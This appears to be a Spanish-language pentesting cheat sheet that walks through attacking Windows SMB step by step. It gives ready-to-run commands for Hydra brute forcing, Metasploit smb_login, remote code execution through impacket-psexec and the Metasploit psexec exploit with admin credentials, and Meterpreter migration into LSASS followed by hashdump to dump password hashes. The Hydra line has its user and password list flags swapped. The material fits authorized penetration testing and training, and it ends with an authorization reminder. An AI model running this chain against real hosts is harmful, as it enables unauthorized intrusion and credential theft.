# Explotación SMB Resumen

{% stepper %}
{% step %}
### Fuerza bruta SMB con Hydra

Podemos hacer ataques de fuerza bruta contra el protocolo SMB con Hydra:

{% code title="Comando" %}
```bash
hydra -P user.txt -L passwords.txt smb://192.168.0.30
```
{% endcode %}

Si obtenemos errores al realizar fuerza bruta contra SMB, podemos recurrir a Metasploit para escanear/ataques de autenticación.
{% endstep %}

{% step %}
### Uso de Metasploit para login SMB

Ejemplo de uso del módulo auxiliar de Metasploit para intentar logins SMB:

{% code title="Metasploit - configuración del módulo auxiliar" %}
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.0.30
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Acceso con psexec (Impacket)

Una vez que encontremos las credenciales de un usuario administrador, podemos intentar autenticarnos usando psexec de Impacket siempre y cuando algún recurso compartido tenga permisos de escritura:

{% code title="Impacket-psexec" %}
```bash
impacket-psexec administrator@192.168.0.20
```
{% endcode %}

Si el recurso compartido tiene permisos de escritura: !\[\[Pasted image 20230729132935.png]]

Si no tiene permisos de escritura: !\[\[Pasted image 20230730145409.png]]
{% endstep %}

{% step %}
### Obtener sesión Meterpreter con Metasploit (psexec)

Si preferimos usar Metasploit para obtener una sesión de Meterpreter, usamos el exploit psexec:

{% code title="Seleccionar módulo" %}
```bash
use exploit/windows/smb/psexec
```
{% endcode %}

Y configuramos los parámetros necesarios:

{% code title="Parámetros" %}
```bash
set RHOST 192.168.0.20
set RPORT 445
set SMBUSER administrator
set SMBPASS password1
```
{% endcode %}

Esto nos dará, como en el caso anterior, una sesión de Meterpreter: !\[\[Pasted image 20230729133215.png]]
{% endstep %}

{% step %}
### Dump de hashes (LSASS) desde Meterpreter

Una vez con sesión Meterpreter, podemos dumpear las contraseñas buscando el proceso lsass y migrando a él antes de ejecutar hashdump:

{% code title="Comandos Meterpreter" %}
```bash
pgrep lsass   # Localizar PID del proceso lsass
migrate 464   # Migrar al PID correspondiente (ejemplo 464)
hashdump      # Volcar hashes
```
{% endcode %}

Salida de ejemplo: !\[\[Pasted image 20230729133349.png]]
{% endstep %}

{% step %}
### Enumerar usuarios desde la shell

También podemos listar los usuarios disponibles desde la shell con:

{% code title="Comando" %}
```bash
net users
```
{% endcode %}

En este caso se muestran tres usuarios dentro del SMB: !\[\[Pasted image 20230729133613.png]]
{% endstep %}
{% endstepper %}

{% hint style="info" %}
Asegúrate de contar con autorización para realizar estas pruebas en los sistemas objetivo. Estas técnicas son intrusivas y deben usarse únicamente en entornos de pruebas o con permiso explícito.
{% endhint %}
